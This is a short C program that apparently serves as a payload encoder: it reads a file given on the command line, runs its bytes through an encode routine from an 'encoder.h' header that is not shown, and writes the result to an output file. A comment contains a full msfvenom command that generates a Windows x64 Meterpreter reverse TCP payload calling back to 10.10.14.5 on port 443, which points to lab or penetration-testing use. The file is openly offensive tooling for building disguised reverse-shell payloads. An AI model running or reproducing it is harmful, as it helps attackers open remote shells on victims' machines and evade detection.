#include <stdio.h>
#include <Windows.h>
#include "encoder.h"

// mkdir C:\Users\Public\testme
unsigned char* get_file(char* filename, size_t* ret_size) {
	FILE* file = fopen(filename, "rb");
	fseek(file, 0, SEEK_END);
	long size = ftell(file);
	fseek(file, 0, SEEK_SET);
	unsigned char* pe_mem = calloc(1, size);
	fread(pe_mem, size, 1, file);
	fclose(file);
	*ret_size = size;
	return pe_mem;
}

// msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f c | xclip -selection clipboard
int main(int argc, char* argv[])
{
	size_t len;
	unsigned char* buf = get_file(argv[1], &len);
	encode(buf, len);

	FILE* f = fopen(argv[2], "wb");
	fwrite(buf, 1, len, f);
	fclose(f);
	return 0;
}